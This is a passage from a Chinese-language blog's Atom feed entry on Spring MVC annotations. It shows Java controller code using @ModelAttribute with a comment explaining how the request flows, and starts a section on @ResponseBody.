System.out.println(&quot;从数据库中获取一个对象：&quot; + user);</span><br><span class="line">        map.put(&quot;abc&quot;, user);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 运行流程：</span><br><span class="line">     *         1.执行@ModelAttribute注解修饰的方法，从数据库中取出对象，把对象放入Map中，键为：user；</span><br><span class="line">     *         2.SpringMVC从Map中取出User对象，并把表单的请求参数赋值给该User对象的对应属性；</span><br><span class="line">     *         3.SpringMVC把上述对象传入目标方法的参数。</span><br><span class="line">     * </span><br><span class="line">     * 注意：在@ModelAttribute修饰的方法中，放入到Map时的键需要和目标方法入参类型的第一个字母小写的字符串一致</span><br><span class="line">     * </span><br><span class="line">     * @param user</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(&quot;/testModelAttribute&quot;)</span><br><span class="line">    public String testModelAttribute(@ModelAttribute(&quot;abc&quot;) User user) &#123;</span><br><span class="line">        System.out.println(&quot;修改：&quot; + user);</span><br><span class="line">        return SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x08-ResponseBody"><a href="#0x08-ResponseBody" class="headerlink" title="0x08 @ResponseBody　"></a>0x08 @ResponseBody　</h2><p>作用： 该注解用于将Controller的方法返回的对象，通过适当的HttpMessageConverter转换为指定格式后，写入到Response对象的body数据区。</p><p>使用时机：返回的数据不是html标签的页面，而是其他某种格式的数据时（如json、xml等）使用；</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SpringMVC注解&quot;&gt;&lt;a href=&quot;#SpringMVC注解&quot; class=&quot;headerlink&quot; title=&quot;SpringMVC注解&quot;&gt;&lt;/a&gt;SpringMVC注解&lt;/h1&gt;&lt;h2 id=&quot;0x00-Controller&quot;&gt;&lt;a href=&quot;#0x
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
</feed>
